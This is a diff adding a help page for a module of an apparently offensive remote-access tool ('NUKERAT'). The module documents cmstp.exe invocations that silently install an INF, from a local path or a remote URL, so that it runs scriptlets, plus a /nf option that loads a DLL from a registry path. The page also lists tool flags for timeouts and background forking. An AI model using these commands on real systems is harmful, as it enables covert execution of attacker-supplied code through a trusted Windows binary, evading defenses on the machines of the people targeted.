@@ -1,0 +1,26 @@
+ABOUT
+    Connection Manager profile installer.
+    Silent /ni /s INF install runs scrobj scriptlets; /nf loads a DLL
+    from a registry-specified CmstpExtensionDll path.
+
+USAGE:
+    cmstp.exe /ni /s {PATH_ABSOLUTE:.inf}
+    cmstp.exe /ni /s {REMOTEURL:.inf}
+    cmstp.exe /nf
+
+ARGUMENTS:
+    /ni                          No desktop icon
+    /s                           Silent install from INF path or URL
+    /nf                          Load extension DLL from registry
+
+EXAMPLES:
+    cmstp.exe /ni /s {PATH_ABSOLUTE:.inf}
+    cmstp.exe /ni /s {REMOTEURL:.inf}
+    cmstp.exe /nf
+
+NUKERAT FLAGS:
+    -w <seconds>    Maximum wait time until timeout
+    -bg             Fork and run without waiting for output
+
+    Example:
+    cmstp.exe /ni /s {PATH_ABSOLUTE:.inf}
